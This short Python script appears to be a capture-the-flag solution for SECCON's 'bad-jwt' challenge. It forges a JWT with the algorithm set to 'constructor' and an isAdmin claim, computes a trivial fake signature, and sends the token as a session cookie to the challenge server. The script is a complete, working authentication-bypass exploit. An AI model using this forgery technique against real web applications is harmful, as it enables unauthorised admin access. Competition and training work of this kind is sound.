import requests
import base64

header = b'{"typ":"JWT","alg":"constructor"}'
payload = b'{"isAdmin":true}'

enc_header = base64.b64encode(header).replace(b'=', b'').decode()
enc_payload = base64.b64encode(payload).replace(b'=', b'').decode()
sig = base64.b64encode(header+payload).replace(b'=', b'').decode()

cookies = {
    'session': f'{enc_header}.{enc_payload}.{sig}'
}
print(cookies)

response = requests.get('http://bad-jwt.seccon.games:3000/', cookies=cookies, verify=False)
#response = requests.get('http://localhost:3000/', cookies=cookies, headers=headers, verify=False)

print(response.text)